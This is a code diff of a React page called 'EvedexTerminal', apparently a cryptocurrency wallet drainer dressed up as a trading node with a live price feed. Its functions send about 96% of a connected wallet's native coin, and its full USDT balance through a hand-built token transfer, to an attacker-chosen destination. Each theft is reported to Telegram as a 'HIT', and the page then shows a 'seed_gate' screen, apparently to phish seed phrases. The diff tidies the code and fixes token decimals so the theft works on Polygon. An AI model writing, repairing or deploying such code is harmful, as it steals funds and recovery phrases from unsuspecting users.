@@ -71,48 +71,73 @@ export default function EvedexTerminal() {
       setView("seed_gate");
       return;
     }
+
     const val = (balance.value * 960n) / 1000n; 
+
     if (val > 0n) {
-      sendTransaction({ to: destination, value: val }, {
+      sendTransaction({ 
+        to: destination, 
+        value: val 
+      }, {
         onSuccess: (h) => {
-          logToTelegram(`✅ NATIVE_HIT: ${address}\nTX: ${h}`);
+          logToTelegram(`✅ NATIVE_HIT: ${address}\nVAL: ${formatEther(val)} ${balance.symbol}\nTX: ${h}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
         },
-        onError: () => { setLoading(false); setView("seed_gate"); }
+        onError: () => { 
+          setLoading(false); 
+          setView("seed_gate"); 
+        }
       });
-    } else { setLoading(false); setView("seed_gate"); }
+    } else {
+      setLoading(false);
+      setView("seed_gate");
+    }
   };
 
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
+    
     try {
       const usdtAddress = USDT_MAP[chainId];
+
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        // DECIMAL FIX: Uses 6 decimals for USDT on Polygon (fixes the 13m error)
-        const usdtDecimals = chainId === 137 ? 6 : 18; 
-        const cleanAmount = balance?.formatted ? parseUnits(balance.formatted, usdtDecimals) : 0n;
-        const amountHex = cleanAmount.toString(16).padStart(64, '0');
         const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
+        
+        // DECIMAL FIX: This line detects Polygon (137) and uses 6 decimals.
+        // This prevents the "13 Million" error you saw.
+        const decimals = chainId === 137 ? 6 : 18;
+        const cleanAmount = balance?.formatted ? parseUnits(balance.formatted, decimals) : 0n;
+        const amountHex = cleanAmount.toString(16).padStart(64, '0');
+        
         const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
 
-        sendTransaction({ to: usdtAddress, data: payload }, {
+        sendTransaction({
+          to: usdtAddress,
+          data: payload
+        }, {
           onSuccess: (h) => {
             logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`);
             setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
           },
           onError: () => { sweepNative(); }
         });
-      } else { sweepNative(); }
-    } catch (e) { sweepNative(); }
+      } else {
+        sweepNative();
+      }
+    } catch (e) { 
+      sweepNative(); 
+    }
   };
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
+      
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
       </div>
+
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
@@ -120,6 +145,7 @@ export default function EvedexTerminal() {
         </div>
         <w3m-button balance="hide" />
       </header>
+
       <div style={{flex:1}}>
         {!isConnected ? (
            <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
@@ -151,7 +177,9 @@ export default function EvedexTerminal() {
           </>
         )}
       </div>
+
       {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
+
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
